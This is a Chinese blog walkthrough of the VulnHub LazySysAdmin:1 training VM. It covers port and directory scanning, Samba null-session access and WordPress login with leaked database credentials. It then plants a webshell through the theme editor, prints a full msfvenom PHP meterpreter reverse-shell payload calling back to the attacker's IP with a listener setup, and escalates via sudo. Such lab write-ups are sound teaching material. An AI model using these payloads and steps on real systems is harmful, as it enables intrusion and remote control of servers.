# 原创
：  VulnHub渗透测试实战靶场 - LAZYSYSADMIN: 1

# VulnHub渗透测试实战靶场 - LAZYSYSADMIN: 1

#### VulnHub渗透测试实战靶场 - LAZYSYSADMIN: 1

## 环境下载

> 
戳此进行[环境下载](https://download.vulnhub.com/lazysysadmin/Lazysysadmin.zip)


## LAZYSYSADMIN: 1靶机搭建

> 
具体步骤参考[VirtualBox(Host only)和VMware共用同一虚拟网卡](https://blog.csdn.net/LYJ20010728/article/details/119395324)



> 
攻击机IP地址：`192.168.56.102`


## 渗透测试

### 信息搜集

> 
用Kali自带的netdiscover探测一下目标靶机的IP：`sudo netdiscover -r 192.168.56.0/24`<br/> 得到目标靶机IP地址：`192.168.56.103`


> 
用masscan快速目标靶机的端口：`masscan 192.168.56.103 -p 1-10000 --rate=1000`


> 
用namp收集一下开放端口的信息：`nmap -T4 -A -v 192.168.56.103 -p 80,22,6667,139,3306,110,445`


### 漏洞挖掘

> 
用`dirb`来爆破目标靶机80端口存在的目录：`dirb http://192.168.56.103 /usr/share/dirb/wordlists/common.txt`


```
---- Scanning URL: http://192.168.56.103/ ----
==&gt; DIRECTORY: http://192.168.56.103/apache/                                                                                                                                                                                               
+ http://192.168.56.103/index.html (CODE:200|SIZE:36072)                                                                                                                                                                                   
+ http://192.168.56.103/info.php (CODE:200|SIZE:77256)                                                                                                                                                                                     
==&gt; DIRECTORY: http://192.168.56.103/javascript/                                                                                                                                                                                           
==&gt; DIRECTORY: http://192.168.56.103/old/                                                                                                                                                                                                  
==&gt; DIRECTORY: http://192.168.56.103/phpmyadmin/                                                                                                                                                                                           
+ http://192.168.56.103/robots.txt (CODE:200|SIZE:92)                                                                                                                                                                                      
+ http://192.168.56.103/server-status (CODE:403|SIZE:294)                                                                                                                                                                                  
==&gt; DIRECTORY: http://192.168.56.103/test/                                                                                                                                                                                                 
==&gt; DIRECTORY: http://192.168.56.103/wordpress/                                                                                                                                                                                            
==&gt; DIRECTORY: http://192.168.56.103/wp/ 

```

<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/1c46436e09e54e289d384e60d8178f7e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/d84f427b360446809c5f362c677db0b6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
根据扫描的结果，挨个访问试试



> 



> 



> 



> 
用Kali自带的`wpscan`扫描wordpress查看是否存在漏洞


```
┌──(kali㉿kali)-[~/Desktop]
└─$ wpscan --url http://192.168.56.103/wordpress              
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.56.103/wordpress/ [192.168.56.103]
[+] Started: Thu Aug  5 11:29:58 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.7 (Ubuntu)
 |  - X-Powered-By: PHP/5.5.9-1ubuntu4.22
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.56.103/wordpress/xmlrpc.php
 | Found By: Link Tag (Passive Detection)
 | Confidence: 100%
 | Confirmed By: Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.56.103/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Registration is enabled: http://192.168.56.103/wordpress/wp-login.php?action=register
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.56.103/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.56.103/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.8.1 identified (Insecure, released on 2017-08-02).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.56.103/wordpress/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=4.8.1&lt;/generator&gt;
 |  - http://192.168.56.103/wordpress/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=4.8.1&lt;/generator&gt;

[+] WordPress theme in use: twentyfifteen
 | Location: http://192.168.56.103/wordpress/wp-content/themes/twentyfifteen/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://192.168.56.103/wordpress/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.0
 | Style URL: http://192.168.56.103/wordpress/wp-content/themes/twentyfifteen/style.css?ver=4.8.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.56.103/wordpress/wp-content/themes/twentyfifteen/style.css?ver=4.8.1, Match: 'Version: 1.8'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 &lt;=============================================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Aug  5 11:30:01 2021
[+] Requests Done: 170
[+] Cached Requests: 5
[+] Data Sent: 46.31 KB
[+] Data Received: 268.202 KB
[+] Memory used: 210.09 MB
[+] Elapsed time: 00:00:03

```

> 
之前扫描端口时发现445端口是开放的，查看一下`Samba服务`


> 
使用`enum4linux`进行扫描：`enum4linux 192.168.56.103`，发现存在空连接漏洞


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/02f37013150e4bc09bbca3d19bedb515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2935f0be9a224c10a6734d1734391f70.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

### getshell

> 
使用linux连接samba服务<br/> 或者进行远程挂载


```
smbclient //192.168.56.103/share$
或者
mount -t cifs -o username='',password='' //192.168.56.103/share$ /mnt

```

> 
查看一下wordpress的配置文件：`more wp-config-sample.php` (q退出查看)<br/> 得到数据库账号和密码：`Admin:TogieMYSQL12345^^`


> 
登入phpmyadmin，发现此用户无法查看数据库中的用户


> 
尝试用数据库账号密码登录`http://192.168.56.103/wordpress/wp-admin/`


> 
发现存在命令执行漏洞：`http://192.168.56.103/wordpress/wp-admin/theme-editor.php?file=404.php&amp;theme=twentyfifteen&amp;scrollto=24`，写入一句话木马<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/7dddf8a8206f409b8e4d0bd06b4e38ec.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>


> 
在`\wordpress\wp-content\themes\twentyfifteen\`找到编辑过后的php文件，测试命令执行漏洞，成功触发恶意代码


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/921d732b21aa4a778cd5d9a44a481c56.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/4fa4e769b75a4f32a36421b1e79a7ce2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
蚁剑连接，发现无法连接成功，看别的大师傅的教程说只要菜刀才能连接成功，个人测试后发现`doughnuts`可以连接成功但是无法执行命令


> 
注意到wordpress页面频繁出现`togie`，猜想可能是ssh账号，同时在samba服务查看到一个文件，疑似密码


> 
用Xshell连接ssh，成功getshell


#### 补充：绕过蚁剑等工具无法使用下getshell

> 
这里可以通过404页面写入php反弹shell代码来反弹shell从而绕过部分工具连接shell没有效果


> 
生成一个php的反弹shell


```
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=1234 R &gt; shell.php

```

> 
shell内容


```
/*&lt;?php /**/ error_reporting(0); $ip = '192.168.56.102'; $port = 1234; if (($f = 'stream_socket_client') &amp;&amp; is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s &amp;&amp; ($f = 'fsockopen') &amp;&amp; is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s &amp;&amp; ($f = 'socket_create') &amp;&amp; is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) &lt; $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') &amp;&amp; ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();

```

> 
在`msfconsole`中起一个监听


```
msfconsole
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 192.168.56.102
set lport 1234
run

```

> 
访问`http://192.168.56.103/wordpress/wp-content/themes/twentyfifteen/404.php`，成功反弹shell


### 提权

> 
通过执行`id`命令发现该id可以直接使用sudo提权

